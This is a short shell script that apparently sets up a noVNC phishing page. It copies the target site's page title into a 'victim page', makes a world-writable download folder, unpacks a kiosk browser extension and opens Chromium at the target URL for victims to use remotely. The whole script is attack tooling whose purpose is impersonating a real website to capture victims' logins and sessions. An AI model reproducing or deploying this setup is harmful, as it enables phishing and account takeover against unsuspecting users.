#export DISPLAY=:0

# read URL from file (env)
#URL=$(head -1 php.ini | cut -d "=" -f 2)

# prepare site
cp /home/user/noVNC/vnc_lite.html /home/user/noVNC/index.html
#ln -s /home/user/noVNC/vnc_lite.html /home/user/noVNC/index.html

# get title of target site and set it to our victim page
TITLE=$(curl -sk "$URL" | grep "<title>" | grep "</title>" | sed "s/<[^>]*>//g")
#echo $TITLE > title.txt && sed -i "4s/.*/$(head -1 title.txt)/g" noVNC/index.html
sed -i "4s/.*/$TITLE/g" noVNC/index.html

# prepare download dir
#sudo mkdir Downloads 2> /dev/null && sudo chmod 777 -R Downloads && sudo chmod 777 kiosk.zip
sudo mkdir -p Downloads && sudo chmod 777 -R Downloads && sudo chmod 777 kiosk.zip
#TODO kiosk.zip?

# do some dbus stuff
# TODO config not found... necessary?
#sudo mkdir -p /var/run/dbus && sudo dbus-daemon --config-file=/usr/share/dbus-1/system.conf --print-address


unzip -n kiosk.zip
sleep 2
#/usr/bin/chromium-browser --load-extension=/home/user/kiosk/ --kiosk $URL --fast ---fast-start &
/usr/bin/chromium-browser $URL &

# start chromium with target URL, sleep: wait for resolution to be read and stored to disk
#sleep 2 && /usr/bin/chromium-browser "$URL" &
